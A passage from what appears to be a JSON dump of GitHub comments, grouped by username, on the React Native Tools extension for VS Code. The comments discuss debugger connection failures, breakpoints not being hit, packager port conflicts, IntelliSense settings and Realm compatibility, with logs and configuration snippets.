setupEnvironmentHelper.getLatestSupportedRNVersionForExpo();. suggestion\n               reject(\"Received object is incorrect\");. ",
    "transitive-bullshit": "@ruslan-bikkinin that's fine, but how can we customize the launch configuration if it's program pointed to in launch.json doesn't exist?. ",
    "majirosstefan": "@ruslan-bikkinin how can we add params for each configuration in .vscode/launch.json  that will be also passed to run-ios / run-android scripts ? e.g. specify env file, etc.. ",
    "vcipriani": "Thanks for the quick response.  I figured it out.  The settings.json was not being picked up because the .vscode folder was not in the root of the folder I had opened in vscode.  Fyi for others, you can see what version of typescript salsa is targetting by hovering over \"(Salsa)\" at the bottom right.\n. ",
    "lokinfey": "@dlebu  My VSCode version is 0.10.9. I have only one instance in my mac .  Not process using my 8081 port . No any external packager process . \n@digeff  it is status is \nhttp://localhost:8081/status\npackager-status:running\n\n. @digeff 0.21\n. ",
    "n8stowell82": "Is this change in the 'master' branch? I have tried building the master locally to test this, and I am still unable to hit a breakpoint when testing with iOS Simulator. \n. @digeff \n1. At which commit are you on master?\nI am currently pulling the latest from master before each try.\n2. What version of VS Code are you using?\nVersion 0.10.10 (0.10.10)\n3. By your comment it seems you are on React-Native 0.21 right?\nYes I am currently on React Native 0.21\n4. Could you please copy us the latest log messages that you see both on the Debug Console and the React-Native output channel when this issue happens?\n@MSLaguana the debugger continues to cycle the same message as mentioned above by @lokinfey \n[vscode-react-native] Finished executing: react-native run-ios --simulator iPhone 5s\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Disconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\n[vscode-react-native] Debugging session started succesfuly.\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\nvscode building the extension output:\nLoading development extension at /Users/nathan/Development/Desktop/vscode/extensions/vscode-react-native\n[Internal] [Info] Extension messaging server started.\n[Internal] [Info] Handling message: START_PACKAGER\n[Internal] [Info] Handling message: PREWARM_BUNDLE_CACHE\n[Internal] [Info] About to get: http://localhost:8081/index.ios.bundle\n. here is the output of the debugger cycling:\n[vscode-react-native] Disconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Disconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Disconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Disconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Disconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Disconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Disconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\n. Hey guys, just wanted to drop in here and let you know that it is indeed working.  After re-reading all the comments above I ran lsof -n -i4TCP:8081 and found that there was another process listening on port 8081.  Most likely I think it was a relic of a previous run of my application.  once I killed that process it connected immediately and was able to hit a breakpoint.  Also I should mention that I packaged the extension myself in order to run a single instance of vscode.\nSo is there anyway that the extension could warn the user that there is another process already listening on that port? or even offer to kill that process for the user?\nThanks for all your hard work.  I am really liking this plugin\n. Ok, interesting I never saw that message.  I wonder if there is a better way to alert the user.  Could you possibly throw a warning message in the top notification center of vscode?  I think something like that would be best.  Preferably I would like a button that would offer to kill that process and restart the console again.  But that is just me ;)  Thanks again for your great tool.\n. ",
    "nitsujri": "How do I install this package from a specific commit in VS Code?\n. ",
    "djyde": "I caught this warning just now and I found that the reason was I did open a chrome tab for debug session. After closing it, the debugger works again \n. ",
    "neilyoung": "Same problem. \nreact-native-cli: 0.2.0\nreact-native: 0.27.2\nvs-code Version 1.3.0-insider (1.3.0-insider)\nCannot debug because of no connectivity from iOS device to debugger\n. Same here. \"code .\" then \nReact Native intellisense was successfully configured for this project. Restart to enable it.\nRegardless of how many time you restart - it will come again. VSCODE_TSJS=1 provokes an error message on first start but seems to work somehow. But what the hell is this??\nEDIT: Some voodoo to enable JSX I suppose\n. Yes, thanks. Found the meaning by myself already. But it is still helpful. Using latest code insider.\n. My \"app\" is what react-native is scaffolding. node version is 5.1.1\nHere is \"my glorious app\":\n```\n/*\n  * Sample React Native App\n  * https://github.com/facebook/react-native\n  * @flow\n  /\nimport React, { Component } from 'react';\n import {\n   AppRegistry,\n   StyleSheet,\n   Text,\n   View\n } from 'react-native';\nclass Hello extends Component {\n   render() {\n     return (\n       \n\n           Welcome to React Native!\n         \n\n           To get started, edit index.ios.js\n         \n\n           Press Cmd+R to reload,{'\\n'}\n           Cmd+D or shake for dev menu\n         \n\n     );\n   }\n }\nconst styles = StyleSheet.create({\n   container: {\n     flex: 1,\n     justifyContent: 'center',\n     alignItems: 'center',\n     backgroundColor: '#F5FCFF',\n   },\n   welcome: {\n     fontSize: 20,\n     textAlign: 'center',\n     margin: 10,\n   },\n   instructions: {\n     textAlign: 'center',\n     color: '#333333',\n     marginBottom: 5,\n   },\n });\nAppRegistry.registerComponent('Hello', () => Hello);\n```\n. BTW: The \"app\" is working fine in simulator. I just wanted to \"debug\", what else is your plugin for?\n. Yes, thanks. Upgrading to node 6.6 did help to get rid of the error message. But breakpoints are still not hit, and this is my problem as long as I deal with react-native and vscode. The error above was just something new after having left aside the entire suff for month.\n. I'm having sourcemap files at proper location, but nothing helps. No stop.\n. It doesn't stop at \"console.log()\"\nEDIT: I don't have that .babelrc file in this project, nevertheless there are sourcemap files in .vscode/.react\nEDIT2: But even with this file no change\n. \n\n. No I have not modified it. I also using your plugin 0.2.0, code insiders version 1.6.0\nEDIT: But I should be able to try 1.5.3 as well. Please wait\n. Ha... with 1.5.3 it works...\nEDIT: It does not work inside TexInput onSubmitEditing event handler\n. Thanks for your extraordinary help. The best I got from MS within the last 30 years :) Sorry for the rant, I was just so p...d\n. As a side info regarding \"Does not stop in onSubmitEdtiting event handler with 1.5.3: If there is a breakpoint set the function is not even executed. Seems to get stuck, but breakpoint is not hit.\nEDIT: Yepp. Your plugin hangs. After hitting \"CTRL_R\" in simulator window the app complains about \"Runtime not ready for debugging\"\n. Yeah, cool. Sounds reasonable. Very thin ice, it seems :) However, many thanks for your help again.\n. Accidently closed it, sorry\n. Just to let you know: Your \"pause\" hint works, but there is no way to inspect variables and stuff.\nNot such a thing, if one knows.\n. ",
    "Lughino": "I get the same error.\nAfter ~5 seconds i get\nRuntime is not ready for debugging.\nMake sure Packager server is running.\nin console:\nInstalling build/Build/Products/Debug-iphonesimulator/TestApp.app\nLaunching org.reactjs.native.example.TestApp\norg.reactjs.native.example.TestApp: 34633\n[vscode-react-native] Finished executing: react-native run-ios --simulator iPhone 5s --project-path ios\n[vscode-react-native] Starting debugger app worker.\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Debugging session started successfully.\nIf launch the simulator with react-native run-ios works perfectly.\nreact-native version: 0.27.2\nreact version: 15.1.0 \n. I'm debugging with simulator.\nI'm sorry for having only accused the plugin, after various tests even if launched from a terminal.\nIt seems to be a version of \"react-native\" problem, if I use the 0.31 version works perfectly from the terminal but through plugin not work in giving this error in console:\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Debugging session started successfully.\n[vscode-react-native] [Warning] Couldn't import script at <http://localhost:8081/index.ios.bundle?platform=ios&dev=true&minify=false>. Debugging won't work: Try reloading the JS from inside the app, or Reconnect the VS Code debugger: Cannot GET /json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9sdWdoaW5vL1Byb2plY3RzL2lnbml0ZUFwcE5vU2FnYS9ub2RlX21vZHVsZXMvcmVhY3QtbmF0aXZlL3BhY2thZ2VyL3JlYWN0LXBhY2thZ2VyL3NyYy9SZXNvbHZlci9wb2x5ZmlsbHMvcHJlbHVkZV9kZXYuanMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IjtBQUNBLE9BQU8sT0FBUCxDQUFpQixJQUFqQjs7QUFFQSxPQUFPLHFCQUFQLENBQStCLEtBQUssR0FBTCxFQUEvQiIsImZpbGUiOiJwcmVsdWRlX2Rldi5qcyIsInNvdXJjZXNDb250ZW50IjpbIi8qIGVzbGludCBzdHJpY3Q6MCAqL1xuZ2xvYmFsLl9fREVWX18gPSB0cnVlO1xuXG5nbG9iYWwuX19CVU5ETEVfU1RBUlRfVElNRV9fID0gRGF0ZS5ub3coKTtcbiJdfQ==\n. ",
    "iOSQiao": "vscode: 1.14.0\nnode: v6.11.1\nI can debug for Attach to packager, but when the debug path has Chinese, it cannot be debugged.. ",
    "csholmq": "Certainly! \n1. React Native 0.20.0. React Native Tools 0.1.0.\n2. Yes.\n3. No errors outside of the developer console.\n4. Don't know about debugging, but simulating on Android and iOS works. Pretty new to React Native unfortunately.\nThis is what pops up when I start an Android simulator. Still works though.\n\nSeems to behave the same on OS X as well.\n. First error is still reproducible. \n1. Open Code (Insiders build)\n2. Toggle Developer Tools\n3. Console\n. :+1:\n. ",
    "awclives": "Hmm, it still doesn't work for me.  Attached a screenshot with the language mode changed to JavaScript React.  I must be missing something?\n\n. 0.10.9\n. I don't have a typings directory.\n\n. Hope this does it.\n\n. View and Text are still white.\ni also uninstalled and reinstalled the react native extension.\n\n. working fine now.  thank you.\n. ",
    "prudhviraju255": "Hi, I am also getting the same problem I am sharing my screen In that screen mongoose word should be blue color but is showing as white. I dont understand why it is showing like that?. \n. ",
    "johnoscott": "in my case, .vscode/settings.json exists but is invalid. The file contents are indeed invalid :\ne{}\n. ",
    "moneyonrails": "It looks like it's a linting problem, where visual studio code highlights the code red but it actually works when I run it.\n. ",
    "wiky": "setting.json\njson\n{\n  \"javascript.suggestionActions.enabled\": false\n}. ",
    "StoneRen": "OS X EI Capitan\nVSCode :  0.10.11 \nreact-native-cli: 0.1.10\nreact-native: 0.21.0\n1. launchctl setenv VSCODE_TSJS 1\n2. export VSCODE_TSJS=1\n3. settings.json \n   {\n   \"typescript.tsdk\": \"/Users/Ren/.nvm/versions/node/v5.0.0/lib/node_modules/typescript/lib\"\n   }\nThen restart VSCode,but it still not work \n. ",
    "mghohoo": "I have the same problem with StoneRen.\nstatus bar shows Javascript 1.9****dev.\nBut it's no intellisense problem in windows.\n. Intellisense works in ubuntu 1504.\nMAC:\nVSCode = 0.10.11\nReact Native Tools = 0.1.2\nreact-native = 0.22.2\n. Maybe permisson cause this problem.No intellisense if code is installed  by brew cask.\nNow I manually install it,just copy to /Applications.It works.\n. ",
    "vsccarl": "It looks like I'm using version 0.1.2 of the native plugin.\nMy Package.json file looks like this:\n\n. @MSLaguana Here is what my node_modules/react-native/package.json  looks like:\npackage.txt\n@digeff There aren't any errors when opening the project. Running the run-android command gives this:\n\n. @MSLaguana Yes, I'm using open folder which contains the package.json that I linked earlier:\n\n. @digeff Here are the Dev Tools console errors:\n\n. I'm using 0.10.12-alpha\n. ",
    "aidansteele": "For what it's worth I had the same issue today with a brand new installation of both React Native and this extension. Turns out that the extension had trouble spawning react-native because I had only installed the CLI locally, not globally. Globally installing fixed that issue. \nPerhaps instead of launching react-native we should execute the RN within node_modules?\n. ",
    "code945": "i just had the same issue, and i have installed the react-native-cli globally.\nC:\\Users\\hongxu.lin>react-native -v\nreact-native-cli: 1.0.0\nreact-native: n/a - not inside a React Native project directory\nC:\\Users\\hongxu.lin>cd c:\\projects\\superL\nc:\\projects\\superL>react-native -v\nreact-native-cli: 1.0.0\nreact-native: 0.34.1\nstill don't have launchReactNative.js,do you guys @MSLaguana @aidansteele   know what's the   problem?\n. I have React Native Tools v0.2.0 installed, and my vscode is 1.6.0\n\n. I can run react-native -v and get react-native-cli: 1.0.0 react-native: n/a - not inside a React Native project directory  and i can see react-native-cli under C:\\Users\\hongxu.lin\\AppData\\Roaming\\npm\\node_modules\\\nis that mean i have installed the react-native-cli globally? Any other debug info that may help?\n. c:>where react-native\nC:\\Users\\hongxu.lin\\AppData\\Roaming\\npm\\react-native\nC:\\Users\\hongxu.lin\\AppData\\Roaming\\npm\\react-native.cmd\n. c:\\projects\\superL>vdcode\n'vdcode' is not recognized as an internal or external command,\noperable program or batch file.\nc:\\projects\\superL>code\nafter i run code the vscode show up(before is minimized window)\n. That's solve my problem, thanks!!! So it means that i can't run vscode from the shortcut icon on the desktop, only node cmd?\n. ",
    "lihuazhang": "\nI got this issue too. When I restart system and launch VS Code. The message pop up. \nOn OSX 10.11.4\n\n. @hamiltonia 1.0.0 (1.0.0). This only happens  when I restart OSX and launch the Code for the first time.\nIs there any log file that can target the issue?\n. ",
    "patrick91": "the message did disappear when I run Visual Studio Code setting VSCODE_TSJS to 1\nVSCODE_TSJS=1 code .\nMaybe it is related to #143\n. ",
    "miqu": "The same problem on Debian Linux. Installed code from Debian package. Complains every time. Tthe enviroment variable hint helped.\n. ",
    "herdotage": "@MSLaguana thanks for your answer first , I reinstall the react-native-cli as you said, and reinstall the React Native  Tools , the problem remains. the command React Native: Run Android can neither start the packager nor run app in Android : \n```\n### Attempting to start the React Native packager\n### Starting Packager\n[Error : 0104]  Failed to run the application in Android: Could not start the packager.\n```\nI reinstall vs code last sunday, I've tried a lot to fix it , and it's useless. Now I have no choice but continue to use Android Studio to run my App \u2514(T_T;)\u2518.\n. @digeff Sorry for the delay too, I got dumped last week ,it was a difficult time...\nso , in the Node.js command prompt , react-native start and react-native run-android both works well ,the problem only occurs on my company's computer. the VS Code version is '0.10.11', extensions are React Native Tools and Reactjs code snippets ,etc. the same VS Code in other computer works well ,the same project also works well in that computer . it seems it's VS Code itself  that has wrong, here is the console log:\nOverwriting filename <<.jsx>> to now point to mime <<text/x-jsx>>\nCannot read property 'languageIds' of undefined: TypeError: Cannot read property 'languageIds' of undefined\n    at file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:98:5560\n    at Array.forEach (native)\n    at file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:98:5037\n    at Array.forEach (native)\n    at e._handler (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:98:5009)\n    at Object.listener (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:58:28803)\n    at e._triggerPointListener (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:58:30786)\n    at e.registerPlugins (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:58:31386)\n    at t.$onPluginHostReady (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:71:21766)\n    at t.e.handle (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:71:29651)\nOverwriting filename <<.jsx>> to now point to mime <<text/x-jsx>>\n[uncaught exception]: TypeError: Cannot convert object to primitive value\nTypeError: Cannot convert object to primitive value\n    at new Error (native)\n    at Client.trackException (C:\\Program Files (x86)\\Microsoft VS Code\\resources\\app\\node_modules\\applicationinsights\\Library\\Client.js:67:25)\n    at e.logException (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:23:30848)\n    at e.log (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:112:10791)\n    at t.handleEvent (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:68:2959)\n    at t.e.publicLog (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:68:144)\n    at t.publicLog (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:68:5186)\n    at t.e.flushErrorBuffer (file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:67:30198)\n    at file:///C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/workbench.main.js:67:30058\nUncaught TypeError: Cannot convert object to primitive value\n[Plugin Host] rejected promise not handled with 1 second\nError while executing React Native Packager.: spawn react-native.cmd ENOENT\nError while executing command 'react-native.cmd start --port 8081': spawn react-native.cmd ENOENT\nWARNING: Promise with no error callback:undefined\nTypeError: Cannot read property 'message' of undefined(\u2026)\n. @digeff Bingo, problem solved. My react-native.cmd located at  %APPDATA%\\Roaming\\npm\\react-native.cmd. In the past I run the react-native command via Node's command prompt ,not the system's. Hardly did I use the system's command prompt, but VS Code use it , when set the right PATH variable and restart my computer, the promblem solved.Thanks a lot for your answers.\n. ",
    "JeandeCampredon": "Hi @hamiltonia thank you for answering so fast !\n- I have tried opening both way with the same result.\n- my jsconfig.json is pretty simple :\n{\n    \"compilerOptions\": {\n      \"module\": \"system\",\n      \"experimentalDecorators\": true\n    },\n    \"exclude\": [\n      \".git\",\n      \"node_modules\",\n      \"android\",\n      \"ios\",\n      \"config\",\n      \"planning\",\n      \".idea\",\n      \"Andromeda\",\n      \"scripts\"\n    ]\n}\n- here is the path where I find my project :\n  /Users/jean/Work/Corona\nbut It might come from my project since initiating a new project with the react-native-cli is working\n. Indeed removing the project settings (I moved it to the user settings) fixed the issue, thank you !\nI am not really sure to understand why though, here is my previous settings.json :\n// Place your settings in this file to overwrite the default settings\n{\n  \"editor.tabSize\": 2,\n  \"files.autoSave\": \"afterDelay\",\n  \"files.trimTrailingWhitespace\": true,\n  \"telemetry.enableTelemetry\": true\n}\n. Great news ! Well done\n. ",
    "tianhonghui": "This is the error log:\nnode --debug-brk=35706 launchReactNative.js android 9090 simulator \nDebugger listening on port 35706\n[vscode-react-native] Downloaded debuggerWorker.js (Logic to run the React Native app) from the Packager.\n[vscode-react-native] Executing command: react-native run-android\nAndroid project not found. Maybe run react-native android first?\n[vscode-react-native] Finished executing: react-native run-android\n[vscode-react-native] [Error : 0706]  Cannot debug application: Android project not found.\n. > Is there a reason that you do not want to add an android project?\nActually I have a react native project without android or iOS code in git repository maybe A,and android project in git repository B,iOS project in git repository C.\nSo I want start debugger alone without additional gradle task.\n. In another word, if I didn't change any android or iOS code,there is no reason that I need reinstall the app when I start the debugger.\n. Thanks for this amazing tools.\n. ",
    "zio-zhang": "project  run ok  in react-native run-iso \nthis error only show debug iso \n.  manually react-native run-ios and then you enable debugging in chrome ,no error ,is ok \nonly vscode  debug ,debug iso \n. test more times ,use debug mode\uff0cadd breakpoint, run debug ,sometimes show error;\nwhen error ,reboot similator ,delete app,debug again\nif run ok ,debug to be invalid\uff0cbreakpoint not break;\n. This trigger this error condition\uff1a\n1\u3001use realm\n2\u3001vscode debug , Successfully set up iso simulator environment debugging  in Chrome \n. use\n    react-native run-ios \n    debug in chrome\nis ok ,no error\n. ",
    "appden": "@MSLaguana Please let us know how we can fix this in Realm. We'd be happy to make that fix, or you can send us a PR if you'd like.\n. @MSLaguana I think I figured out what we need to get this working. I tried using sync-request, but I need to require() it with the native Node require() function that VS Code exposes into the sandbox here. Unfortunately, the React Native code overrides that here. If you could also expose the same require() function as nativeRequire() then we could use that to gain access to the sync-request module and things should work from there. :smile:\n. This will be resolved by PR realm/realm-js#512. Thanks again for your help @MSLaguana!\n@axemclion Debug mode for Realm requires we make synchronous HTTP requests to the application from wherever the JS is being debugged (normally Chrome, but Node in the case of VS Code). That is why we sprinkle in some special sauce to make this work. :smile:\n. @axemclion I'm have been working on Realm for React Native, but I'm taking some time away for the next couple months, so I recommend you talk to @alazier, who is leading the project. Good luck!\n. @MSLaguana You're absolutely right about window, but at the time I was successfully able to debug with VS Code, but that may have been relying on something else to inject the window alias. I'm not actively working on the project right now, but I'll cc those who are here: @alazier @fealebenpae\n. @MSLaguana Thanks so much for addressing this issue! I tested it and this works as expected.\nThere appears to be another unrelated issue to figure out before Realm will work under VS Code. I'll investigate this further and report my findings.\n. ",
    "alazier": "I just tried this out and this change isn't quite enough to get things working. Realm needs to be able to make synchronous http requests in order for the rpc layer to work in debug mode. We had to jump through a few hoops to make this work with react-native/chrome and we may need to do the same to get things working with this setup.\n. We are working on a fix for this which should hopefully go into the next release.\n. ",
    "eladgel": "any new about this? I really want to move to VS already\n. anything new about this bug?\n. if i install visual studio with react native support this will work now? how can I tell in the future?\n. ",
    "alcat2008": "Is there any progress? \n. ",
    "axemclion": "@appden Pardon my naive question - Is there a reason you guys are doing a special case for VSCode and browser platforms ? Other native plugins (like camera) seem to work just fine. Is there more documentation about this that I can read up on ? \n. @appden Thanks. Btw, do you work at Realm ? I was planning to write something like a \"Storage Explorer\" for Realm with VSCode, and had some questions about collaboration. \n. @quincycs I am working on a demo - looks like you can already use VSCode with Exponent !! Will send an update soon. . @quincycs I wrote a blog post and video on how you can debug CRNA with VSCode. I spoke to @dikaiosune and he told me that they are introducing a way to add environment variables that control which port the packager runs on. With this, we would be able to attach the VSCode debugging to 8081.\n. I also believe that we do not want a way to bootstrap new CRNA projects using VSCode. I would suggest using CRNA from the command line. Debugging CRNA apps however should be supported. . cc @dikaiosune and @brentvatne for comments on this. @vladimir-kotikov I think the best way to understand this would be to get on the Expo slack adn talk to @dikaiosune . cc @vladimir-kotikov . Awesome !! Thanks. . ",
    "Dallas187": "Hi, I'm using the latest realm (v0.14.3) and visual studio (Version 1.5.2 (1.5.2)) and I still get the error on iOS simulator during debug: 'Missing Realm constructor - please ensure RealmReact framework is included!'\n\"dependencies\": {\n    \"react\": \"^15.3.0\",\n    \"react-native\": \"^0.32.0\",\n    \"realm\": \"^0.14.3\"\n  }\ncc: @MSLaguana @appden \n. It would be good to get an idea of when this will be fixed. I was planning to use Realm in a project but this is making it impossible.\n@alazier @fealebenpae\n. Unfortunately that doesn't work. But I like your thinking.\n. @alazier @fealebenpae - Any updates on this one? \n. Thanks @alazier . Is there an ETA?\n. ",
    "RoderickJDunn": "Hi @alazier , Is this supposed to be fixed now? I'm unable to debug on VSCode with realm on the latest version. . ",
    "arshbot": "@alazier any updates? Currently seeing this issue as of today. Can confirm that I am also having the same issue as @jpsouzasilva and have a near identical launch.json. I have launching with iOS and simulator however . ",
    "gilesbradshaw": ".In which exact line\n<ListView>\n- I change it now to \n{ \n    return <ListView>\n(trying to hit return above)\n. Can you hit breakpoints in other parts of the program?\nsort of but when I put in a break point it seems to stop at a different place in the editor..\n.What happens if you use a hard breakpoint as in:\ndebugger;\nIt kind of works although again it shows the breakpont hit in the wrong place (but I can watch function params).\nIf u wanted to try my app you could do \ngit clone https://github.com/gilesbradshaw/ua-ql-mobile.git awesome2\ncd awesome2\nnpm i\ndebugger gets hit when you pic \"fourth\" or \"fifth\" in navbar at top\n\"debugger\"  is in components/referencelinks.js line 55 \n(if u did try and I've removed debugger - just add it above return  on line 55)\n. Thanks a lot for looking - I'll have a play with the babel plugins\n. I think that zlib.js file is the souce of the issue - the last thing that happened was I had a break on an exception in that file.  Could I have accidentally edited it?  Perhaps I need a re install...\n. I seem to have fixed this by re installing zlib\nsudo npm i zlib\nI am guessing it got corrupted I remember an exception in that file so maybe I hit a key and edited it by mistake ...\n. I'm only guessing it was corrupted but I did npm i zlib so I assume it was in my project ie node_modules\n. ",
    "changsi-an": "Sounds like it's a source map generation issue. I will close the bug for now. Please contact us again to reopen the bug if it's not the case.\n. Here is an update:\n1. We can confirm that the issue is 100% reproducible with node 6.x. But not with 4.x.\n2. We have observed that the node process has run into the event handler(handleTap) and broke at the requested break point. However the node process never notifies us a breakpoint being hit. Because our debugger is not notified, there is no one to drive the UI to break at the source code. We compared this with a working scenario, (that is, if we set breakpoint outside of a event handler, the breakpoint can be hit), we can receive the break point message correctly. \nSo this looks like a bug in Node.js itself.\n3. We were trying to get a minimum example for reproduction. We wrote a simple nodejs app to simulate how we do debugging, but it doesn't reproduce there.\n. Tracking this issue here as well.\n. LGTM\n. Can you help check what Node version you are on?\n. Thanks @jpgarcia \nFrom my understanding. None of those break point should work at node 6.x series. And that is the same issue as #273 (The reason is explained there). I tried 6.2.0 today, and that was the experience for me.\nIf applicable to you, switching to node 4.5.0 will fix the issue. I can get the breakpoint hit in the fat arrow function.\nWe are also following with Node.JS group on this issue. Breakpoint event is not reported in Node.js 6\n. In the investigation we also noticed that the source map is not generated correctly. This reproduces even without VS code. We believe that it's a react-native issue.  Source map for the bundle is not generated correctly when fat arrow function is used\n. LGTM. LGTM. @digeff PTAL. ",
    "foobar8675": "Hi @digeff I just re-ran visual studio code and it prompted me for some updates. I updated the updates and re-ran and it all just seemed to work. thank you!\n. same problem here :(. @vladimir-kotikov do you know if the next extension release has happened yet - or can you point me to the docs for how to track extension releases? . thank you @vladimir-kotikov . ",
    "jicongw": "This issue does not repro any more. If we see this happening again, then we will re-open.\n. @littlethree Thanks for reporting this issue. \nWe took a look and found a similar issue #61 which has a fix described as\nYou need to enable \"allowSyntheticDefaultImports\". This is the jsconfig.json:\njsconfig.json\n{\n    \"compilerOptions\": {\n        \"allowSyntheticDefaultImports\": true\n    }\n}\nIn my project, I don't see this file but I see tsconfig.json and made modification. It worked in the case described in #61.\nHowever, as in #61, this is not a feature we provide. Could you raise this issue on Microsoft/TypeScript? This feature could be missing.\n. Thanks for the change. Looks good to me.\n. @alfonsogarciacaro We have investigated this issue and found that our extension does not treat .fsx files debug-able. We would have to talk to VS Code team to see if we support this feature.\nIf you do need to debug .fsx file, here is the workaround:\ngo to ~/.vscode/extensions/vsmobile.vscode-react-native-0.1.6/package.json\nin the debuggers section, add \"fsharp\" to \"languageIds\", as shown below\n\"debuggers\": [\n            {\n                \"type\": \"reactnative\",\n                \"label\": \"React Native\",\n                \"program\": \"./out/debugger/reactNativeDebugEntryPoint.js\",\n                \"runtime\": \"node\",\n                \"enableBreakpointsFor\": {\n                    \"languageIds\": [\n                        \"fsharp\",\n                        \"javascript\",\n                        \"typescript\",\n                        \"javascriptreact\",\n                        \"typescriptreact\"\n                    ]\n                },\nYou would also need to make sure that you have fsharp VS code extension installed. Otherwise, it won't know what \"fsharp\" is.\n. Hi @alfonsogarciacaro , any luck on the issue?\n. No problem. Sorry it did not work for you again.\nHere is what I did to get it work.\n1) react-native init a new project, npm install fable and react-native-sm-transformer\n2) add fable related file and modify index.android.js according to your setup -> to get your example to work on my machine, I also need to make sure the file path in source map matches the path on my machine.\n3) perform the hack I described above\n4) in vs code, set a breakpoint in fableLib.fsx\n5) open cmd, run react-native start --resetCache to clear cache\n6) start react-native-sm-transformer by running ./node_modules/.bin/rnst -> this will start the packager, currently we do not have a way of specifying customized arguments to react-native packager\n7) in vs code, go to debug tab and in the drop down select \"attach to packager\"\n8) open cmd, run \"react-native run-android\"\n9) on your emulator, you may need to shake the device (cmd+M on mac and control+M on windows) and click debug js remotely.\nFor incremental change, you would make change in your code, compile and deploy using step 8.\nLet me know how it goes.\nI can share you a repo if it still does not work for you.\nI also have not been able to make it stop in index.android.bundle, which is kinda interesting.\nBut the steps listed above seem to do the right thing.\n. @alfonsogarciacaro Here is my launch.json file in .vscode folder under project root directory.\nC:\\HelloWorld\\.vscode\\launch.json\n{\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Debug Android\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"android\",\n            \"internalDebuggerPort\": 9090,\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n        {\n            \"name\": \"Debug iOS\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"target\": \"iPhone 5s\",\n            \"internalDebuggerPort\": 9090,\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n        {\n            \"name\": \"Attach to packager\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"attach\",\n            \"internalDebuggerPort\": 9090,\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        }\n    ]\n}\n. Glad I could help :)\nYeah, I agree with you that it would be much better to automate this whole process. We will definitely get there soon!\n. I don't have further concerns. We probably want to find a way to consolidate logic of packager operations to a shared location since I have seen similar functionality in a couple places. This may require further refactor which could come later. Looks good to me.\n. ReadMe looks fine now.\n. You may want to utilize the new type for expect and actual comparison here. But it's a minor issue. NBD.\n. Should we consider passing in workspace as an optional parameter for this function?\n. minor space issue.\n. This is replaced with SILENT in CommandVerbosity, but I do not see it's used by the logger. Will keep looking at other places. Possibly in Log class. For now, leave a note here.\n. Did a search in repo and looks like this silent is never used. Makes sense to remove it.\n. Do we want to have a stop packager as well?\n. Why are we calling .then multiple times? Is this for better logging purposes?\nCan't we simply put these XDL method invocation into one single .then?\n. Yeah, ensurePackagerIsRunning makes more sense to me.\n. two 0s? hm....\n. nromal -> normal\n. ",
